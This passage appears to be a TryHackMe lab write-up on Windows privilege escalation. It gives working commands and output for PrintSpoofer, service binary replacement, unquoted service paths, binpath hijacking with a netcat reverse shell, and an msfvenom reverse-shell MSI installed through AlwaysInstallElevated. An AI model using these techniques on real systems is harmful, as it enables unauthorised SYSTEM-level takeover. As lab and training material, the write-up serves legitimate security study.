SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeSystemtimePrivilege         Change the system time                    Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

C:\Windows\system32>
```

### Priv esc
Use this
https://github.com/dievus/printspoofer

```text
C:\Temp>PrintSpoofer.exe -c "C:\Users\user\Downloads\shell443.exe"
PrintSpoofer.exe -c "C:\Users\user\Downloads\shell443.exe"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.17.54] from (UNKNOWN) [10.10.228.2] 49791
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```

------

## Insecure service binaries

### Detection

winPEAS

```text
    filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]
```

Verify file perms with Get-Acl
```text
PS C:\Users\user\Downloads> Get-Acl "C:\Program Files\File Permissions Service\filepermservice.exe" | Select-Object -Expand "AccessToString"
Get-Acl "C:\Program Files\File Permissions Service\filepermservice.exe" | Select-Object -Expand "AccessToString"
Everyone Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
WIN-QBA94KB3IOF\Administrator Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
BUILTIN\Users Allow  ReadAndExecute, Synchronize
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES Allow  ReadAndExecute, Synchronize
```
Everyone has Full Control. Check we can start/stop service.
```text
PS C:\Program Files\File Permissions Service> (sc.exe sdshow filepermsvc)[1] | ConvertFrom-SddlString | Select-Object -Expand DiscretionaryAcl | Select-String -Pattern "Everyone"
(sc.exe sdshow filepermsvc)[1] | ConvertFrom-SddlString | Select-Object -Expand DiscretionaryAcl | Select-String -Pattern "Everyone"

Everyone: AccessAllowed (CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory,
Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Traverse, WriteExtendedAttributes)
```

Everyone can start/stop service. Check status of service. Get-Service doesn't show everything especially who runs it

```text
PS C:\Windows\system32> Get-Service filepermsvc | fl *
Get-Service filepermsvc | fl *


Name                : filepermsvc
RequiredServices    : {}
CanPauseAndContinue : False
CanShutdown         : False
CanStop             : False
DisplayName         : File Permissions Service
DependentServices   : {}
MachineName         : .
ServiceName         : filepermsvc
ServicesDependedOn  : {}
ServiceHandle       :
Status              : Stopped
ServiceType         : Win32OwnProcess
StartType           : Manual
Site                :
Container           :
```

In PS 3.0 [it's this](https://stackoverflow.com/questions/59725591/powershell-get-service-detailed-description-of-the-windows-service)
```text
PS C:\Program Files\File Permissions Service> Get-CimInstance win32_service | ?{$_.Name -like 'filepermsvc'} | fl *
Get-CimInstance win32_service | ?{$_.Name -like 'filepermsvc'} | fl *


Name                    : filepermsvc
Status                  : OK
ExitCode                : 1077
DesktopInteract         : False
ErrorControl            : Normal
PathName                : "C:\Program Files\File Permissions Service\filepermservice.exe"
ServiceType             : Own Process
StartMode               : Manual
Caption                 : File Permissions Service
Description             :
InstallDate             :
CreationClassName       : Win32_Service
Started                 : False
SystemCreationClassName : Win32_ComputerSystem
SystemName              : WIN-QBA94KB3IOF
AcceptPause             : False
AcceptStop              : False
DisplayName             : File Permissions Service
ServiceSpecificExitCode : 0
StartName               : LocalSystem
State                   : Stopped
TagId                   : 0
CheckPoint              : 0
DelayedAutoStart        : False
ProcessId               : 0
WaitHint                : 0
PSComputerName          :
CimClass                : root/cimv2:Win32_Service
CimInstanceProperties   : {Caption, Description, InstallDate, Name...}
CimSystemProperties     : Microsoft.Management.Infrastructure.CimSystemProperties
```
Older PS is
```text
PS C:\Program Files\File Permissions Service> Get-WmiObject win32_service | ?{$_.Name -like 'filepermsvc'} | fl *
Get-WmiObject win32_service | ?{$_.Name -like 'filepermsvc'} | fl *


PSComputerName          : WIN-QBA94KB3IOF
Name                    : filepermsvc
Status                  : OK
ExitCode                : 1077
DesktopInteract         : False
ErrorControl            : Normal
PathName                : "C:\Program Files\File Permissions Service\filepermservice.exe"
ServiceType             : Own Process
StartMode               : Manual
__GENUS                 : 2
__CLASS                 : Win32_Service
__SUPERCLASS            : Win32_BaseService
__DYNASTY               : CIM_ManagedSystemElement
__RELPATH               : Win32_Service.Name="filepermsvc"
__PROPERTY_COUNT        : 26
__DERIVATION            : {Win32_BaseService, CIM_Service, CIM_LogicalElement, CIM_ManagedSystemElement}
__SERVER                : WIN-QBA94KB3IOF
__NAMESPACE             : root\cimv2
__PATH                  : \\WIN-QBA94KB3IOF\root\cimv2:Win32_Service.Name="filepermsvc"
AcceptPause             : False
AcceptStop              : False
Caption                 : File Permissions Service
CheckPoint              : 0
CreationClassName       : Win32_Service
DelayedAutoStart        : False
Description             :
DisplayName             : File Permissions Service
InstallDate             :
ProcessId               : 0
ServiceSpecificExitCode : 0
Started                 : False
StartName               : LocalSystem
State                   : Stopped
SystemCreationClassName : Win32_ComputerSystem
SystemName              : WIN-QBA94KB3IOF
TagId                   : 0
WaitHint                : 0
Scope                   : System.Management.ManagementScope
Path                    : \\WIN-QBA94KB3IOF\root\cimv2:Win32_Service.Name="filepermsvc"
Options                 : System.Management.ObjectGetOptions
ClassPath               : \\WIN-QBA94KB3IOF\root\cimv2:Win32_Service
Properties              : {AcceptPause, AcceptStop, Caption, CheckPoint...}
SystemProperties        : {__GENUS, __CLASS, __SUPERCLASS, __DYNASTY...}
Qualifiers              : {dynamic, Locale, provider, UUID}
Site                    :
Container               :
```

### Replace the binary

```text
PS C:\Program Files\File Permissions Service> copy ~\Downloads\shell443.exe .\filepermservice.exe
copy ~\Downloads\shell443.exe .\filepermservice.exe
PS C:\Program Files\File Permissions Service> dir
dir


    Directory: C:\Program Files\File Permissions Service


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/24/2021   1:12 AM           7168 filepermservice.exe
```

### Priv esc

```text
PS C:\Program Files\File Permissions Service> sc.exe start filepermsvc
sc.exe start filepermsvc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.17.54] from (UNKNOWN) [10.10.216.242] 49861
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Strangely for msfvenom exe they persist. If you use exe-service you won't get the error but instead

```text
PS C:\Users\user\Downloads> sc.exe start filepermsvc
sc.exe start filepermsvc

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3392
        FLAGS              :
```

But still get the reverse shell

------

## Unquoted service paths hijacking

### Detection

winpeas
```text
    unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
   =================================================================================================
```

Priv esc check
```text
Name              : unquotedsvc
ImagePath         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
User              : LocalSystem
ModifiablePath    : C:\
IdentityReference : BUILTIN\Users
Permissions       : WriteData/AddFile
Status            : Stopped
UserCanStart      : True
UserCanRestart    : True

Name              : unquotedsvc
ImagePath         : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
User              : LocalSystem
ModifiablePath    : C:\Program Files\Unquoted Path Service
IdentityReference : BUILTIN\Users
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
Status            : Stopped
UserCanStart      : True
UserCanRestart    : True
```

Verify
```text
PS C:\> ((sc.exe sdshow unquotedsvc)[1] | ConvertFrom-SddlString).DiscretionaryAcl | Select-String -Pattern "Everyone"
((sc.exe sdshow unquotedsvc)[1] | ConvertFrom-SddlString).DiscretionaryAcl | Select-String -Pattern "Everyone"

Everyone: AccessAllowed (CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory,
Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Traverse, WriteExtendedAttributes)
```
Everyone can start/stop the svc

Get details
```text
PS C:\Users\user\Downloads> sc.exe qc unquotedsvc
sc.exe qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```
And it's started by SYSTEM. 

### Check perms

Let's test where we can write to
```text
PS C:\> echo testing > testing.txt
echo testing > testing.txt
out-file : Access to the path 'C:\testing.txt' is denied.
At line:1 char:1
+ echo testing > testing.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand

PS C:\> echo testing > "C:\Program Files\testing.txt"
echo testing > "C:\Program Files\testing.txt"
out-file : Access to the path 'C:\Program Files\testing.txt' is denied.
At line:1 char:1
+ echo testing > "C:\Program Files\testing.txt"
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException
    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand

PS C:\> echo testing > "C:\Program Files\Unquoted Path Service\testing.txt"
echo testing > "C:\Program Files\Unquoted Path Service\testing.txt"
```
Only to "C:\Program Files\Unquoted Path Service". Copy a reverse shell or .bat to this path

### Priv esc

```text
PS C:\Program Files\Unquoted Path Service> dir
dir


    Directory: C:\Program Files\Unquoted Path Service


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/5/2020   8:32 AM                Common Files
-a----        5/23/2021   7:46 AM           7168 Common.exe

PS C:\Program Files\Unquoted Path Service> sc.exe start unquotedsvc
sc.exe start unquotedsvc

root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.6.109] from (UNKNOWN) [10.10.0.189] 49900
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

------

## Insecure service permissions

### Detection

Privesc check
```text
+------+------------------------------------------------+------+
| TEST | SERVICES > Permissions - SCM                   | VULN |
+------+------------------------------------------------+------+
| DESC | Interact with the Service Control Manager (SCM) and   |
|      | check whether the current user can modify any         |
|      | registered service.                                   |
+------+-------------------------------------------------------+
[*] Found 1 result(s).


Name           : daclsvc
ImagePath      : "C:\Program Files\DACL Service\daclservice.exe"
User           : LocalSystem
Status         : Stopped
UserCanStart   : True
UserCanRestart : True
```


Verify
```text
PS C:\Users\user\Downloads> ((sc.exe sdshow daclsvc)[1] | ConvertFrom-SddlString).DiscretionaryAcl | Select-String -Pattern "Everyone"
((sc.exe sdshow daclsvc)[1] | ConvertFrom-SddlString).DiscretionaryAcl | Select-String -Pattern "Everyone"

Everyone: AccessAllowed (CreateDirectories, ExecuteKey, GenericExecute, GenericRead, GenericWrite, ListDirectory,
Read, ReadAndExecute, ReadAttributes, ReadExtendedAttributes, ReadPermissions, Traverse, WriteData,
WriteExtendedAttributes, WriteKey)
```
Everyone can start/stop this service (WriteExtendedAttributes, Traverse). It is started by SYSTEM and is currently stopped.

Check service details
```text
PS C:\Users\user\Downloads> sc.exe qc daclsvc
sc.exe qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
PS C:\Users\user\Downloads> sc.exe query daclsvc
sc.exe query daclsvc

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

### Hijack service binpath

```text
PS C:\Users\user\Downloads> sc.exe config daclsvc binpath= "C:\Users\user\Downloads\nc64.exe 10.4.6.109 443 -e powershell.exe"
sc.exe config daclsvc binpath= "C:\Users\user\Downloads\nc64.exe 10.4.6.109 443 -e powershell.exe"
[SC] ChangeServiceConfig SUCCESS
PS C:\Users\user\Downloads> sc.exe query daclsvc
sc.exe query daclsvc

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
PS C:\Users\user\Downloads> sc.exe qc daclsvc
sc.exe qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Users\user\Downloads\nc64.exe 10.4.6.109 443 -e powershell.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
PS C:\Users\user\Downloads> sc.exe start daclsvc
sc.exe start daclsvc

root@kali:~/CTF/THM/WinPE# rlwrap -r nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.6.109] from (UNKNOWN) [10.10.0.189] 49820
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
whoami
nt authority\system
```

------

## AlwaysInstallElevated

### Detection

winpeas
```text
  [+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

privesccheck
```text
+------+------------------------------------------------+------+
| TEST | CONFIG > AlwaysInstallElevated                 | VULN |
+------+------------------------------------------------+------+
| DESC | Check whether the 'AlwaysInstallElevated' registry    |
|      | keys are configured and enabled. If so any user might |
|      | be able to run arbitary MSI files with SYSTEM         |
|      | privileges.                                           |
+------+-------------------------------------------------------+
[*] Found 2 result(s).


Name                  : HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated : 1
Enabled               : True

Name                  : HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
AlwaysInstallElevated : 1
Enabled               : True
```

### Priv esc

```text
root@kali:~/CTF/THM/WinPE# msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=10.13.17.54 LPORT=443 -f msi -o reverse443.msi
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of msi file: 159744 bytes
Saved as: reverse443.msi

C:\Users\user\Downloads>msiexec /quiet /qn /i C:\Users\user\Downloads\reverse443.msi
msiexec /quiet /qn /i C:\Users\user\Downloads\reverse443.msi

root@kali:~/CTF/THM/WinPE# rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.13.17.54] from (UNKNOWN) [10.10.147.11] 49803
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```